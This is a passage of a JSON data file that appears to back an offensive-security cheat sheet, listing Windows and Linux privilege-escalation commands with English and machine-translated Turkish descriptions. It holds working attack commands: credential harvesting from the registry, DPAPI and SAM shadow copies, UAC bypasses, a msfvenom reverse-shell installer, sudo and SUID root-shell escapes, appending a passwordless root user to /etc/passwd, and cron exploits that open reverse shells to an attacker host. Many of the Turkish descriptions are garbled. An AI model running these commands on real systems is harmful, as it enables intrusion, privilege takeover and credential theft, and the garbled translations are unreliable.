              "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: SAM volume shadow copies üzerinden"
          },
          {
            "title": "IIS Web.config Credentials",
            "desc": "Check IIS configuration for credentials",
            "cmd": "type C:\\inetpub\\wwwroot\\web.config | findstr /i connectionString password",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: IIS configuratifor kimlik bilgileri üzerinde"
          },
          {
            "title": "Search Registry for Passwords",
            "desc": "Search registry for password entries",
            "cmd": "reg query HKLM /f password /t REG_SZ /s",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: registry for password entries"
          },
          {
            "title": "DPAPI Credential Files",
            "desc": "Find DPAPI-protected credential files",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\*\\Microsoft\\Credentials\\*",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: DPAPI-protected kimlik bilgileri files"
          },
          {
            "title": "DPAPI Master Keys Location",
            "desc": "Find DPAPI master key files",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\*\\Microsoft\\Protect\\*",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: DPAPI master key files"
          },
          {
            "title": "Mimikatz DPAPI Decrypt",
            "desc": "Decrypt DPAPI blobs with mimikatz",
            "cmd": "mimikatz.exe \"dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\<CRED_FILE>\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Şifreyi çöz: DPAPI blobs mimikatz ile"
          },
          {
            "title": "SharpDPAPI Triage",
            "desc": "Automated DPAPI credential extraction",
            "cmd": "SharpDPAPI.exe triage",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Otomatik DPAPI kimlik bilgileri extraction"
          },
          {
            "title": "Find KeePass Database Files",
            "desc": "Search for KeePass database files",
            "cmd": "dir /s /b C:\\*.kdbx 2>nul",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for KeePass database files"
          },
          {
            "title": "Find SSH Keys (Windows)",
            "desc": "Search for SSH private keys on Windows",
            "cmd": "dir /s /b C:\\Users\\*\\.ssh\\id_rsa 2>nul",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for SSH private keys Windows üzerinde"
          },
          {
            "title": "Saved RDP Credentials",
            "desc": "Check for saved RDP connection credentials",
            "cmd": "dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\* 2>nul",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: for kayıtlı RDP connectikimlik bilgileri üzerinde"
          },
          {
            "title": "Find Configuration Files",
            "desc": "Search for config files with potential credentials",
            "cmd": "dir /s /b C:\\*.config C:\\*.ini C:\\*.xml C:\\*.json 2>nul | findstr /i /v \"Windows\\\\assembly Windows\\\\Microsoft.NET\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for yapılandırma dosyası potential kimlik bilgileri ile"
          },
          {
            "title": "Browser Saved Passwords (SharpChromium)",
            "desc": "Extract saved browser passwords",
            "cmd": "SharpChromium.exe logins",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: kayıtlı browser passwords"
          },
          {
            "title": "Snaffler Credential Finder",
            "desc": "Automated credential and secret finder across shares",
            "cmd": "Snaffler.exe -s -o snaffler_output.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Otomatik kimlik bilgileri and secret finder shares genelinde"
          },
          {
            "title": "GPP cpassword",
            "desc": "Find Group Policy passwords",
            "cmds": [
              "findstr /SIM /C:\"cpassword\" \\\\<DOMAIN>\\sysvol\\<DOMAIN>\\Policies\\*.xml",
              "# Decrypt: gpp-decrypt <CPASSWORD>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Check Groups.xml, Services.xml, Scheduledtasks.xml",
            "desc_tr": "Bul: Group Policy passwords"
          },
          {
            "title": "Invoke-PrivescCheck",
            "desc": "Comprehensive privesc checker",
            "cmd": "Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kapsamlı privesc checker"
          }
        ],
        "name_tr": "Credential Harvesting"
      },
      {
        "name": "AlwaysInstallElevated",
        "commands": [
          {
            "title": "Check AlwaysInstallElevated (HKCU)",
            "desc": "Check if AlwaysInstallElevated is enabled for user",
            "cmd": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if AlwaysInstallElevated is enabled for user"
          },
          {
            "title": "Check AlwaysInstallElevated (HKLM)",
            "desc": "Check if AlwaysInstallElevated is enabled system-wide",
            "cmd": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if AlwaysInstallElevated is enabled system-wide"
          },
          {
            "title": "Exploit AlwaysInstallElevated",
            "desc": "Install malicious MSI with SYSTEM privileges",
            "cmds": [
              "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi",
              "msiexec /quiet /qn /i shell.msi"
            ],
            "tags": [
              "essential"
            ],
            "note": "Both HKCU and HKLM keys must be set to 1",
            "desc_tr": "Kur: malicious MSI SYSTEM privileges ile"
          }
        ],
        "name_tr": "AlwaysInstallElevated"
      },
      {
        "name": "Kernel Exploits",
        "commands": [
          {
            "title": "Windows Exploit Suggester",
            "desc": "Suggest exploits based on systeminfo output",
            "cmd": "python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Suggest exploits based systeminfo output üzerinde"
          },
          {
            "title": "Watson (.NET)",
            "desc": "Find missing KBs and suggest privilege escalation",
            "cmd": "Watson.exe",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: missing KBs and suggest yetki yükseltme"
          },
          {
            "title": "Sherlock (PowerShell)",
            "desc": "Find missing patches for known privesc",
            "cmd": "Import-Module .\\Sherlock.ps1; Find-AllVulns",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: missing patches for known privesc"
          },
          {
            "title": "Check System Architecture",
            "desc": "Determine 32/64-bit for exploit compatibility",
            "cmd": "systeminfo | findstr /i \"System Type\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Determine 32/64-bit for istismar compatibility"
          },
          {
            "title": "Check OS Version",
            "desc": "Get exact OS version and build",
            "cmd": "systeminfo | findstr /i /B \"OS\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: exact OS versiand build üzerinde"
          }
        ],
        "name_tr": "Kernel Exploits"
      },
      {
        "name": "Automated Scanners",
        "commands": [
          {
            "title": "WinPEAS",
            "desc": "Comprehensive Windows privilege escalation scanner",
            "cmd": "winPEASx64.exe",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kapsamlı Windows yetki yükseltme tarayıcı"
          },
          {
            "title": "WinPEAS (Quiet Mode)",
            "desc": "WinPEAS with reduced output",
            "cmd": "winPEASx64.exe quiet systeminfo userinfo",
            "tags": [
              "tool"
            ],
            "desc_tr": "WinPEAS reduced output ile"
          },
          {
            "title": "PowerUp (PowerShell)",
            "desc": "PowerShell privilege escalation scanner",
            "cmds": [
              "Import-Module .\\PowerUp.ps1",
              "Invoke-AllChecks"
            ],
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "PowerShell yetki yükseltme tarayıcı"
          },
          {
            "title": "Seatbelt",
            "desc": "Security-focused host survey tool",
            "cmd": "Seatbelt.exe -group=all",
            "tags": [
              "tool"
            ],
            "desc_tr": "Security-focused host survey tool"
          },
          {
            "title": "SharpUp",
            "desc": "C# port of PowerUp privesc checks",
            "cmd": "SharpUp.exe audit",
            "tags": [
              "tool"
            ],
            "desc_tr": "C# port of PowerUp privesc checks"
          },
          {
            "title": "PrivescCheck",
            "desc": "PowerShell privilege escalation enumeration",
            "cmds": [
              "Import-Module .\\PrivescCheck.ps1",
              "Invoke-PrivescCheck -Extended"
            ],
            "tags": [
              "tool"
            ],
            "desc_tr": "PowerShell yetki yükseltme listeleme"
          },
          {
            "title": "Seatbelt Specific Checks",
            "desc": "Run Seatbelt with targeted security checks",
            "cmd": "Seatbelt.exe -group=user -group=system",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: Seatbelt targeted security checks ile"
          },
          {
            "title": "Seatbelt Remote Execution",
            "desc": "Run Seatbelt against a remote host",
            "cmd": "Seatbelt.exe -group=remote -computername=<TARGET_HOSTNAME> -username=<DOMAIN>\\<USER> -password=<PASS>",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Çalıştır: Seatbelt a uzak host'e karşı"
          },
          {
            "title": "SharpUp Specific Checks",
            "desc": "Run SharpUp with specific vulnerability checks",
            "cmd": "SharpUp.exe audit HijackablePaths ModifiableServiceBinaries ModifiableServices",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: SharpUp belirli zafiyet(ler) checks ile"
          },
          {
            "title": "JAWS Enumeration",
            "desc": "Just Another Windows (Enum) Script",
            "cmd": "powershell -ep bypass -c \"Import-Module .\\jaws-enum.ps1\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Just Another Windows (Enum) Script"
          },
          {
            "title": "Windows Exploit Suggester NG",
            "desc": "Suggest exploits from systeminfo (Python)",
            "cmd": "python wes.py systeminfo.txt -e",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Use: systeminfo > systeminfo.txt, then transfer to attacker",
            "desc_tr": "Suggest exploits systeminfo (Python) üzerinden"
          },
          {
            "title": "WinPEAS Services Info",
            "desc": "WinPEAS focused on service misconfigurations",
            "cmd": "winPEASx64.exe quiet servicesinfo",
            "tags": [
              "tool"
            ],
            "desc_tr": "WinPEAS focused service misconfigurations üzerinde"
          },
          {
            "title": "WinPEAS Network Info",
            "desc": "WinPEAS focused on network information",
            "cmd": "winPEASx64.exe quiet networkinfo",
            "tags": [
              "tool"
            ],
            "desc_tr": "WinPEAS focused network information üzerinde"
          }
        ],
        "name_tr": "Automated Scanners"
      },
      {
        "name": "UAC Bypass",
        "commands": [
          {
            "title": "UAC — fodhelper",
            "desc": "Bypass via fodhelper",
            "cmds": [
              "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c <COMMAND>\" /f",
              "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
              "fodhelper.exe"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: fodhelper üzerinden"
          },
          {
            "title": "UAC — eventvwr",
            "desc": "Bypass via Event Viewer",
            "cmds": [
              "reg add HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command /d \"cmd.exe /c <COMMAND>\" /f",
              "eventvwr.exe"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: Event Viewer üzerinden"
          },
          {
            "title": "UAC — sdclt",
            "desc": "Bypass via sdclt",
            "cmds": [
              "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /d \"cmd.exe /c <COMMAND>\" /f",
              "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
              "sdclt.exe"
            ],
            "tags": [
              "tool"
            ],
            "desc_tr": "Atla: sdclt üzerinden"
          }
        ],
        "name_tr": "UAC Bypass"
      }
    ],
    "name_tr": "Windows Yetki Yükseltme",
    "description_tr": "Escalate privileges on Windows hosts through service misconfigurations, token abuse, credential harvesting, and kernel exploits."
  },
  {
    "id": "linux-escalation",
    "name": "Linux Privilege Escalation",
    "icon": "🐧",
    "description": "Escalate privileges on Linux systems through SUID binaries, sudo misconfigurations, capabilities, cron exploitation, kernel exploits, and container escapes.",
    "subcategories": [
      {
        "name": "System Reconnaissance",
        "commands": [
          {
            "title": "Current User & ID",
            "desc": "Show current user and group memberships",
            "cmd": "id",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: mevcut user and group memberships"
          },
          {
            "title": "Kernel Version",
            "desc": "Display kernel version and architecture",
            "cmd": "uname -a",
            "tags": [
              "essential"
            ],
            "desc_tr": "Display kernel versiand architecture üzerinde"
          },
          {
            "title": "OS Release Info",
            "desc": "Show operating system release details",
            "cmd": "cat /etc/os-release",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: operating system release details"
          },
          {
            "title": "Proc Version",
            "desc": "Show kernel version from proc",
            "cmd": "cat /proc/version",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: kernel versiproc üzerinden üzerinde"
          },
          {
            "title": "Environment Variables",
            "desc": "List all environment variables",
            "cmd": "env",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm ortam değişkenleri"
          },
          {
            "title": "Network Interfaces",
            "desc": "Show network interfaces",
            "cmd": "ip a",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: ağ arayüzü"
          },
          {
            "title": "Active Connections",
            "desc": "Show listening ports and connections",
            "cmd": "ss -tulnp",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: dinleyen portlar and connections"
          },
          {
            "title": "Running Processes",
            "desc": "Show all running processes",
            "cmd": "ps auxf",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm çalışan process"
          },
          {
            "title": "Installed Packages (Debian)",
            "desc": "List installed packages",
            "cmd": "dpkg -l",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yüklü packages"
          },
          {
            "title": "Installed Packages (RHEL)",
            "desc": "List installed packages",
            "cmd": "rpm -qa",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yüklü packages"
          },
          {
            "title": "All Users",
            "desc": "List all users from passwd file",
            "cmd": "cat /etc/passwd",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm users passwd file üzerinden"
          },
          {
            "title": "Readable Shadow",
            "desc": "Check if shadow file is readable",
            "cmd": "cat /etc/shadow 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if shadow file is readable"
          },
          {
            "title": "Home Directories",
            "desc": "List home directories and their contents",
            "cmd": "ls -la /home/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: home directories and their contents"
          },
          {
            "title": "SSH Keys",
            "desc": "Search for SSH private keys",
            "cmd": "find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for SSH private keys"
          },
          {
            "title": "Bash History",
            "desc": "Read bash history for all accessible users",
            "cmd": "cat ~/.bash_history 2>/dev/null; find /home -name .bash_history -exec cat {} \\; 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: bash history for tüm accessible users"
          },
          {
            "title": "Installed Packages (RedHat)",
            "desc": "List RPM packages",
            "cmd": "rpm -qa",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: RPM packages"
          },
          {
            "title": "Enabled Services",
            "desc": "List enabled services",
            "cmd": "systemctl list-unit-files --type=service --state=enabled",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: enabled services"
          },
          {
            "title": "Internal Port Scan",
            "desc": "Scan ports with bash",
            "cmd": "for port in 21 22 25 80 135 443 445 3306 3389 5985 8080; do (echo > /dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"Port $port open\"; done",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma ports bash ile"
          }
        ],
        "name_tr": "System Reconnaissance"
      },
      {
        "name": "SUID & SGID Abuse",
        "commands": [
          {
            "title": "Find SUID Binaries",
            "desc": "Find all SUID binaries on the system",
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm SUID binaries the system üzerinde"
          },
          {
            "title": "Find SGID Binaries",
            "desc": "Find all SGID binaries on the system",
            "cmd": "find / -perm -2000 -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm SGID binaries the system üzerinde"
          },
          {
            "title": "Find SUID+SGID",
            "desc": "Find all SUID and SGID binaries",
            "cmd": "find / -perm -u=s -o -perm -g=s -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm SUID and SGID binaries"
          },
          {
            "title": "SUID bash -p",
            "desc": "If bash has SUID, spawn root shell",
            "cmd": "bash -p",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: bash",
            "desc_tr": "If bash has SUID, spawn root shell"
          },
          {
            "title": "SUID find Exec",
            "desc": "Escalate via SUID find binary",
            "cmd": "find . -exec /bin/sh -p \\; -quit",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: find",
            "desc_tr": "Yetki yükselt: SUID find binary üzerinden"
          },
          {
            "title": "SUID vim Shell",
            "desc": "Escalate via SUID vim",
            "cmd": "vim -c ':!/bin/sh'",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: vim",
            "desc_tr": "Yetki yükselt: SUID vim üzerinden"
          },
          {
            "title": "SUID python Shell",
            "desc": "Escalate via SUID python",
            "cmd": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: python",
            "desc_tr": "Yetki yükselt: SUID pythüzerinden üzerinde"
          },
          {
            "title": "SUID nmap Interactive",
            "desc": "Escalate via SUID nmap (old versions)",
            "cmd": "nmap --interactive\n!sh",
            "tags": [
              "essential"
            ],
            "note": "GTFOBins: nmap (versions 2.02-5.21)",
            "desc_tr": "Yetki yükselt: SUID nmap (old versions) üzerinden"
          },
          {
            "title": "SUID cp Overwrite Passwd",
            "desc": "Overwrite /etc/passwd via SUID cp",
            "cmds": [
              "openssl passwd -1 newpassword",
              "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /tmp/passwd",
              "cp /tmp/passwd /etc/passwd"
            ],
            "tags": [
              "advanced"
            ],
            "note": "GTFOBins: cp",
            "desc_tr": "Üzerine yaz: /etc/passwd SUID cp üzerinden"
          },
          {
            "title": "SUID env Shell",
            "desc": "Escalate via SUID env",
            "cmd": "env /bin/sh -p",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yetki yükselt: SUID env üzerinden"
          }
        ],
        "name_tr": "SUID & SGID Abuse"
      },
      {
        "name": "Sudo Misconfigurations",
        "commands": [
          {
            "title": "List Sudo Privileges",
            "desc": "Show what current user can run as sudo",
            "cmd": "sudo -l",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: what mevcut user can run as sudo"
          },
          {
            "title": "Sudo bash",
            "desc": "Direct root shell via sudo",
            "cmd": "sudo bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Direct root shell sudo üzerinden"
          },
          {
            "title": "Sudo vi/vim Shell",
            "desc": "Escape to shell from sudo vim",
            "cmd": "sudo vim -c ':!/bin/bash'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Escape shell sudo vim üzerinden'e"
          },
          {
            "title": "Sudo find Exec",
            "desc": "Command execution via sudo find",
            "cmd": "sudo find / -exec /bin/bash \\; -quit",
            "tags": [
              "essential"
            ],
            "desc_tr": "komut enjeksiyonu sudo find üzerinden"
          },
          {
            "title": "Sudo python Shell",
            "desc": "Root shell via sudo python",
            "cmd": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo pythüzerinden üzerinde"
          },
          {
            "title": "Sudo perl Shell",
            "desc": "Root shell via sudo perl",
            "cmd": "sudo perl -e 'exec \"/bin/bash\";'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo perl üzerinden"
          },
          {
            "title": "Sudo awk Shell",
            "desc": "Root shell via sudo awk",
            "cmd": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo awk üzerinden"
          },
          {
            "title": "Sudo less Shell",
            "desc": "Shell escape from sudo less",
            "cmd": "sudo less /etc/passwd\n!/bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Shell escape sudo less üzerinden"
          },
          {
            "title": "Sudo more Shell",
            "desc": "Shell escape from sudo more",
            "cmd": "sudo more /etc/passwd\n!/bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Shell escape sudo more üzerinden"
          },
          {
            "title": "Sudo nmap Shell",
            "desc": "Root shell via sudo nmap",
            "cmd": "echo 'os.execute(\"/bin/bash\")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo nmap üzerinden"
          },
          {
            "title": "Sudo tee Write Files",
            "desc": "Write to privileged files via sudo tee",
            "cmd": "echo 'root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yaz: privileged files sudo tee üzerinden'e"
          },
          {
            "title": "Sudo wget File Overwrite",
            "desc": "Overwrite files via sudo wget",
            "cmd": "sudo wget http://<ATTACKER_IP>/malicious_passwd -O /etc/passwd",
            "tags": [
              "essential"
            ],
            "desc_tr": "Üzerine yaz: files sudo wget üzerinden"
          },
          {
            "title": "Sudo cp File Overwrite",
            "desc": "Copy files as root via sudo cp",
            "cmd": "sudo cp /tmp/evil_shadow /etc/shadow",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kopyala: files as root sudo cp üzerinden"
          },
          {
            "title": "Sudo env Shell",
            "desc": "Root shell via sudo env",
            "cmd": "sudo env /bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo env üzerinden"
          },
          {
            "title": "Sudo tar Shell",
            "desc": "Root shell via sudo tar",
            "cmd": "sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo tar üzerinden"
          },
          {
            "title": "Sudo zip Shell",
            "desc": "Root shell via sudo zip",
            "cmd": "sudo zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo zip üzerinden"
          },
          {
            "title": "Sudo git Shell",
            "desc": "Root shell via sudo git",
            "cmd": "sudo git -p help config\n!/bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo git üzerinden"
          },
          {
            "title": "LD_PRELOAD Escalation",
            "desc": "Abuse LD_PRELOAD in sudo configuration",
            "cmds": [
              "echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}' > /tmp/pe.c",
              "gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles",
              "sudo LD_PRELOAD=/tmp/pe.so <ALLOWED_COMMAND>"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Only works if env_keep contains LD_PRELOAD",
            "desc_tr": "Kötüye kullan: LD_PRELOAD sudo configuration içinde"
          },
          {
            "title": "LD_LIBRARY_PATH Escalation",
            "desc": "Abuse LD_LIBRARY_PATH in sudo configuration",
            "cmds": [
              "ldd <SUID_OR_SUDO_BINARY>",
              "# Create malicious shared library matching a linked .so",
              "gcc -fPIC -shared -o /tmp/libfoo.so /tmp/evil.c",
              "sudo LD_LIBRARY_PATH=/tmp <ALLOWED_COMMAND>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kötüye kullan: LD_LIBRARY_PATH sudo configuration içinde"
          },
          {
            "title": "CVE-2021-3156 (Baron Samedit)",
            "desc": "Sudo heap overflow affecting versions < 1.9.5p2",
            "cmd": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
            "tags": [
              "advanced"
            ],
            "note": "Affects sudo versions 1.8.2-1.8.31p2, 1.9.0-1.9.5p1",
            "desc_tr": "Sudo heap overflow affecting versions < 1.9.5p2"
          },
          {
            "title": "Sudo CVE-2019-14287 (Run as -1)",
            "desc": "Bypass sudo runas restriction with UID -1",
            "cmd": "sudo -u#-1 /bin/bash",
            "tags": [
              "advanced"
            ],
            "note": "Works when sudoers has (ALL, !root) - sudo < 1.8.28",
            "desc_tr": "Atla: sudo runas restrictiUID -1 ile üzerinde"
          },
          {
            "title": "Sudo NOPASSWD Abuse",
            "desc": "Check for NOPASSWD entries in sudo -l",
            "cmd": "sudo -l 2>/dev/null | grep -i 'NOPASSWD'",
            "tags": [
              "essential"
            ],
            "note": "Any NOPASSWD entry is a potential escalation vector",
            "desc_tr": "Kontrol et: for NOPASSWD entries sudo -l içinde"
          },
          {
            "title": "Sudo apache2 Shell",
            "desc": "Root shell via sudo apache2",
            "cmd": "sudo apache2 -f /etc/shadow",
            "tags": [
              "tool"
            ],
            "note": "Leaks shadow file contents in error message",
            "desc_tr": "Root shell sudo apache2 üzerinden"
          },
          {
            "title": "Sudo Node.js Shell",
            "desc": "Root shell via sudo node",
            "cmd": "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Root shell sudo node üzerinden"
          },
          {
            "title": "Sudo Docker Shell",
            "desc": "Root shell via sudo docker",
            "cmd": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "tags": [
              "essential"
            ],
            "desc_tr": "Root shell sudo docker üzerinden"
          },
          {
            "title": "Sudo Mysql Shell",
            "desc": "Root shell via sudo mysql",
            "cmd": "sudo mysql -e '\\! /bin/bash'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Root shell sudo mysql üzerinden"
          },
          {
            "title": "Sudo SSH-Keygen Shell",
            "desc": "Read files via sudo ssh-keygen",
            "cmd": "sudo ssh-keygen -D ./lib.so",
            "tags": [
              "advanced"
            ],
            "note": "Create a malicious shared library",
            "desc_tr": "Oku: files sudo ssh-keygen üzerinden"
          },
          {
            "title": "Sudo strace Shell",
            "desc": "Escalate to root via sudo strace — spawns a shell through tracing",
            "cmd": "sudo strace -o /dev/null /bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yetki yükselt: root sudo strace — spawns a shell tracing üzerinden'e üzerinden"
          },
          {
            "title": "Sudo strace (sh variant)",
            "desc": "Minimal strace privesc using /bin/sh",
            "cmd": "sudo strace -e trace=none /bin/sh",
            "tags": [
              "essential"
            ],
            "desc_tr": "Minimal strace privesc /bin/sh kullanarak"
          },
          {
            "title": "Sudo strace Write /etc/passwd",
            "desc": "Add root user via strace — full command injection through traced process",
            "cmd": "sudo strace -o /dev/null sh -c 'echo \"hacker::0:0:root:/root:/bin/bash\" >> /etc/passwd'",
            "tags": [
              "advanced"
            ],
            "note": "Then: su hacker (no password needed)",
            "desc_tr": "Ekle: root user strace — full command enjeksiytraced process üzerinden üzerinde üzerinden"
          }
        ],
        "name_tr": "Sudo Misconfigurations"
      },
      {
        "name": "Scheduled Task Exploitation",
        "commands": [
          {
            "title": "Enumerate Cron Jobs",
            "desc": "List all cron jobs for current user",
            "cmd": "crontab -l",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm crgörevleri for mevcut user üzerinde"
          },
          {
            "title": "System Cron Jobs",
            "desc": "Check system-wide cron jobs",
            "cmds": [
              "cat /etc/crontab",
              "ls -la /etc/cron.d/",
              "ls -la /etc/cron.daily/",
              "ls -la /etc/cron.hourly/"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: system-wide crgörevleri üzerinde"
          },
          {
            "title": "Find Writable Cron Scripts",
            "desc": "Find cron scripts that are world-writable",
            "cmd": "find /etc/cron* -writable -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: crscripts that are world-writable üzerinde"
          },
          {
            "title": "Monitor Cron with pspy",
            "desc": "Monitor process creation to find hidden cron jobs",
            "cmd": "./pspy64",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Upload pspy to target first",
            "desc_tr": "Monitor process creatifind gizli cron görevleri üzerinde'e"
          },
          {
            "title": "Tar Wildcard Injection",
            "desc": "Exploit tar with wildcard in cron job",
            "cmds": [
              "echo '' > '/path/to/cron/dir/--checkpoint=1'",
              "echo '' > '/path/to/cron/dir/--checkpoint-action=exec=sh shell.sh'",
              "echo '#!/bin/bash\\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /path/to/cron/dir/shell.sh"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Works when cron runs: tar czf backup.tar.gz *",
            "desc_tr": "İstismar et: r tar wildcard crgörevleri ile üzerinde içinde"
          },
          {
            "title": "PATH Variable Exploitation",
            "desc": "Exploit cron job that calls commands without full path",
            "cmds": [
              "echo '#!/bin/bash\\nbash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > /tmp/<COMMAND_NAME>",
              "chmod +x /tmp/<COMMAND_NAME>",
              "export PATH=/tmp:$PATH"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Works when cron PATH includes writable directory or cron script uses relative paths",
            "desc_tr": "İstismar et: r crgörevleri that calls commands full path üzerinde olmadan"
          },
          {
            "title": "Systemd Timer Enum",
            "desc": "List systemd timers",
            "cmd": "systemctl list-timers --all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: systemd timers"
          }
        ],
        "name_tr": "Scheduled Task Exploitation"
      },
      {
        "name": "Linux Capabilities",
        "commands": [
          {
            "title": "List All Capabilities",
            "desc": "Find all binaries with capabilities set",
            "cmd": "getcap -r / 2>/dev/null",
            "tags": [
              "essential"
            ],
